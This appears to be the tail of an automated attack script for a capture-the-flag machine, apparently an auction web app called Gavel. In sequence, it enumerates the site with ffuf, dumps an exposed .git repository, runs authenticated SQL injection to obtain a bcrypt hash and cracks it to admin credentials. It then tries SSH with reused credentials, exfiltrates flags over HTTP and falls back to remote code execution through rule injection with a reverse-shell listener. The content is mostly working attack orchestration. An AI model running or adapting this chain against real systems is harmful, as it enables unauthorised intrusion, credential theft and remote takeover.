[[ "$code" != "000" ]] || die "Web app unreachable at $BASE_URL"
ok "Web server HTTP $code"

phase 2 "WEB ENUM + EXPOSED GIT"
info "Quick ffuf enumeration"
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u "$BASE_URL/FUZZ" -e .php -mc 200,301,302,403 \
  -of json -o "$LOOT/ffuf.json" -t 40 -s >/dev/null 2>&1 || true
ok "ffuf results saved"

local_head=$(curl -sS "$BASE_URL/.git/HEAD" || true)
[[ "$local_head" == ref:* ]] || die ".git/HEAD not exposed or unreachable"
ok "Exposed git detected: ${local_head//$'\n'/}"

info "Dumping repository via git-dumper"
git-dumper "$BASE_URL/.git/" "$SRC_DIR" > "$LOOT/git_dumper.log" 2>&1 || die "git-dumper failed"
ok "Source dumped: $SRC_DIR"

phase 3 "AUTHENTICATED SQLI -> HASH"
register_low_user
run_authenticated_sqli

phase 4 "CRACK HASH -> ADMIN CREDS"
crack_bcrypt

phase 5 "ADMIN LOGIN + AUCTION CONTEXT"
login_auctioneer
parse_auction_context

phase 6 "FAST PATH (SSH USER/ROOT)"
attempt_ssh_fast_path || true
read_saved_flags

if [[ -z "$USER_FLAG" || -z "$ROOT_FLAG" ]]; then
  phase 7 "NO-CALLBACK WEB EXFIL FALLBACK"
  web_exfil_user_flag || warn "HTTP exfil user flag path did not return a flag"
  web_exfil_root_flag || warn "HTTP exfil root path did not return a flag"
  read_saved_flags
fi

if [[ -z "$USER_FLAG" || -z "$ROOT_FLAG" ]]; then
  phase 8 "RCE FALLBACK (RULE INJECTION + AUTO HANDLER)"
  start_shell_handler
  inject_rce_rule
  trigger_bid_for_rce
  if ! wait_for_shell_result 210; then
    if grep -qi "Empty reply from server" "$LOOT/trigger.log" 2>/dev/null; then
      warn "Payload likely executed but callback was not received."
      warn "Check LHOST routing/VPN/firewall and ensure listener port ${LPORT} is reachable."
    fi
  fi

  # If shell path only got partial results, try SSH one more time.
  read_saved_flags
  if [[ -z "$ROOT_FLAG" ]]; then
    info "Retrying SSH root capture after RCE path"
    attempt_ssh_fast_path || true
  fi
  read_saved_flags
fi

phase 9 "FINAL RESULTS"
hr
if [[ -n "$USER_FLAG" ]]; then
  ok "USER  -> $USER_FLAG"
else
  warn "USER  -> not captured automatically"
fi

if [[ -n "$ROOT_FLAG" ]]; then
  ok "ROOT  -> $ROOT_FLAG"
else
  warn "ROOT  -> not captured automatically"
fi

step "Loot directory: $LOOT"
step "Transcript: $LOOT/shell_transcript.txt"
step "Trigger log: $LOOT/trigger.log"

if [[ -z "$USER_FLAG" || -z "$ROOT_FLAG" ]]; then
  echo
  warn "Manual fallback hints"
  echo "  1) Verify admin cookie in $ADMIN_COOKIE contains gavel_session"
  echo "  2) Re-run trigger: curl -s -b $ADMIN_COOKIE -X POST $BASE_URL/includes/bid_handler.php -d 'auction_id=${LAST_TRIGGER_ID:-$AUCTION_ID}&bid_amount=${LAST_TRIGGER_BID:-$BID_AMOUNT}'"
  echo "  3) SSH test: sshpass -p '$DB_PASS' ssh ${DB_USER}@${TARGET}"
fi
hr
